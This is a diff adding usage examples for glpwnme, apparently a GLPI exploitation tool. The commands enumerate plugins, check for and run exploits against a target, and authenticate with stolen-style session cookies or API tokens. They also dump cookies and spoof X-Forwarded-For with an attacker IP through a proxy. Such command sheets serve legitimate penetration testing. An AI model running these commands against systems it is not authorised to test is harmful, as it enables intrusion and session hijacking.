@@ -1,1 +1,22 @@
+# GLPI enumeration and vulnerability checks
+glpwnme -t "$TARGET" --list-plugins
+glpwnme -t "$TARGET" --check-all
+glpwnme -t "$TARGET" --check-all --no-opsec
+
+# Inspect, check, run, and clean a specific exploit
+glpwnme -t "$TARGET" -e "$EXPLOIT" --infos
+glpwnme -t "$TARGET" -e "$EXPLOIT" --check
+glpwnme -t "$TARGET" -e "$EXPLOIT" --run -O "option1=value1" "option2=value2"
+glpwnme -t "$TARGET" -e "$EXPLOIT" --clean -O "option1=value1" "option2=value2"
+
+# Authenticate with credentials, a session cookie, or an API token
+glpwnme -t "$TARGET" -u "$USER" -p "$PASSWORD" --auth "$AUTH" --profile "$PROFILE" --check-all
+glpwnme -t "$TARGET" --cookie "$COOKIE" --no-init --check-all
+glpwnme -t "$TARGET" --token "$TOKEN" --dump-cookies
+
+# Use custom headers and a proxy
+glpwnme -t "$TARGET" -H "X-Forwarded-For: $ATTACKER_IP" "User-Agent: Nihil" --proxy "$PROXY" --check-all
+
+# Review actions and cleanup information recorded by glpwnme
+cat log.glpwnme
 glpwnme -h
